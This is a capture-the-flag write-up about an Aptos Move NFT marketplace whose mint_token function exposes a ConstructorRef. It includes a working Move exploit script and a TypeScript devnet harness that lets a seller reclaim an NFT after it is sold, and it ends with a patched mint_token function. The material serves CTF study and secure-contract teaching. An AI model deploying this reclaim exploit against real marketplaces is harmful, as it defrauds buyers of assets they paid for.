# CTF Challenge 3: The ConstructorRef Leak

## Vulnerability 

The `mint_token` function in nft_marketplace contract returns `ConstructorRef`
which exposes it. constructor_ref can be used to generate Transfer_ref which can be stored by the creator of the nft. Once the token get sold, he can relaim the ownership by using the transfer_ref. 

### Steps followed:-

1) User 1 creates a nft by calling `mint_token` function
2) `mint_token` returns token object and `ConstructorRef`.
3) User 1 uses the constructor_ref to generate `TransferRef` which can be stored.
4) Now, User 1 list the nft at marketplace.
5) User 2 buys the nft and User 1 get the money.
6) Now user 1 used the stored `TransferRef` to generate `LinearTransferRef` which will be then used to transfer the nft ownership back to User 1.
7) Now, User 1 can use this vulnerability all the the time to sell nfts and reclaim the nft 


## Cause 
- Exposure of ConstructorRef
- ConstructorRef can be used to generate Refs that are used to transfer the ownership the object.


## Code to exploit the vulnerability

```rust

script {
    use std::signer;
    use std::string::{Self, String};
    use aptos_framework::object::{Self, Object, generate_transfer_ref, generate_linear_transfer_ref, transfer_with_ref};
    use aptos_framework::coin;
    use aptos_framework::aptos_coin::AptosCoin;
    use 0x42::nft_marketplace;
    

    fun test_nft_marketplace(creator: signer, buyer: signer) {

        // Get addresses of creator (seller) and buyer
        let seller_addr = signer::address_of(&creator);
        let buyer_addr = signer::address_of(&buyer);

        // Step 1: Mint a token
        let name = string::utf8(b"Steal Token");
        let description = string::utf8(b"Gonna steal your money");
        let uri = string::utf8(b"https://example.com/token");
        let (token, constructor_ref) = nft_marketplace::mint_token(&creator, name, description, uri);


        let owner = nft_marketplace::get_token_owner(token);
        assert!(owner == seller_addr, 0);

        // Step 2: List the token for sale
        let price = 100; 
        nft_marketplace::list_token_for_sale(&creator, token, price);

        // Capture initial balances
        let initial_seller_balance = coin::balance<AptosCoin>(seller_addr);
        let initial_buyer_balance = coin::balance<AptosCoin>(buyer_addr);

        // Step 3: Buy the token with buyer account
        let payment = coin::withdraw<AptosCoin>(&buyer, price);
        nft_marketplace::buy_token<AptosCoin>(&buyer, token, payment);

        // Step 4: Verify final ownership (should be buyer)
        let owner = nft_marketplace::get_token_owner(token);
        assert!(owner == buyer_addr, 1);

        // Verify balance changes
        let final_seller_balance = coin::balance<AptosCoin>(seller_addr);
        let final_buyer_balance = coin::balance<AptosCoin>(buyer_addr);
        assert!(final_seller_balance == initial_seller_balance + price, 2);
        assert!(final_buyer_balance == initial_buyer_balance - price, 3);

        //reclaim the ownership 
        //ConstructorRef is being used to generate transferRef which will be used to generate LinearTransferRef
        //At last that linearTransferRef will be used to transfer ownership back to the seller

        let transfer_ref     = generate_transfer_ref(&constructor_ref);
        let linear_transfer_ref = generate_linear_transfer_ref(&transfer_ref);
        transfer_with_ref(linear_transfer_ref, seller_addr);

        //verify the ownership
        let owner = object::owner(token);
        assert!(owner == seller_addr, 4);

        
    }
}
```

### Ts code to call the script

```ts

import {
    Aptos,
    Account,
    AccountAddress,
    Ed25519PrivateKey,
    AptosConfig,
    Network,
  } from "@aptos-labs/ts-sdk";
import { expect } from "chai";
import { readFileSync } from "fs";

describe("NFT Tests", function() {
  // Increase timeout for Aptos operations
  this.timeout(30000);
  
  let client: Aptos;
  let creator: Account;
  let buyer: Account;

  const contract_address = "";
  
  before(async () => {
    // Initialize Aptos client
    const config = new AptosConfig({ network: Network.DEVNET });
    client = new Aptos(config);
    
    // Create creator account
    creator = Account.generate();

    await client.fundAccount({
        accountAddress: creator.accountAddress,
        amount: 100000000,
      });

    // Create buyer account
    buyer = Account.generate();

    await client.fundAccount({
        accountAddress: buyer.accountAddress,
        amount: 100000000,
      });
    })
    it("should be able to create an NFT", async () => {
        const buffer = readFileSync("./script.mv", { encoding: null });
        const bytecode = Uint8Array.from(buffer);
    
        // Build transaction with creator as the sender
        const transaction = await client.transaction.build.multiAgent({
            sender: creator.accountAddress,
            secondarySignerAddresses: [buyer.accountAddress],
            data: {
                bytecode,
                typeArguments: [],
                functionArguments: [],
            },
        });

        const [userTransactionResponse] = await client.transaction.simulate.multiAgent(
            {
              signerPublicKey: creator.publicKey,
              secondarySignersPublicKeys: [buyer.publicKey],
              transaction,
            },
        );

        console.log(userTransactionResponse);


        const creatorSenderAuthenticator = client.transaction.sign({
            signer: creator,
            transaction,
        });

        const buyerSenderAuthenticator = client.transaction.sign({
        signer: buyer,
        transaction,
        });

        const pendingTxn = await client.transaction.submit.multiAgent({
        senderAuthenticator: creatorSenderAuthenticator,
        additionalSignersAuthenticators: [buyerSenderAuthenticator],
        transaction,
        });

        const result = await client.waitForTransaction({ transactionHash: pendingTxn.hash });

        console.log(result.hash);

        expect(result.success).to.be.true;
        console.log("NFT stolen successfully");
       
    });
   
});

```

### Note:- You can also create module to exploit the nft_marketplace contract instead of a script.

- Here is the whole codebase :- https://github.com/Rohanarora17/aptos-nft-marketplace-vulnerability


## Suggestions 

1) Don't expose the ConstructorRef at any cost

### Updated Mint_token function

```rust

public fun mint_token(
        creator: &signer,
        name: String,
        description: String,
        uri: String
    ): Object<TokenData> {
        let creator_addr = signer::address_of(creator);
        
        // Create a new object
        let constructor_ref = object::create_named_object(
            creator,
            *string::bytes(&name)
        );
        
        // Generate signer from constructor ref
        let token_signer = object::generate_signer(&constructor_ref);
        let token_address = signer::address_of(&token_signer);
        
        // Create token data
        let token_data = TokenData {
            name,
            description,
            uri,
            creator: creator_addr
        };
        
        // Initialize token ownership
        let token_ownership = TokenOwnership {
            current_owner: creator_addr
        };
        
        // Store token data and ownership
        move_to(&token_signer, token_data);
        move_to(&token_signer, token_ownership);
        
        object::address_to_object<TokenData>(token_address)
    }
```






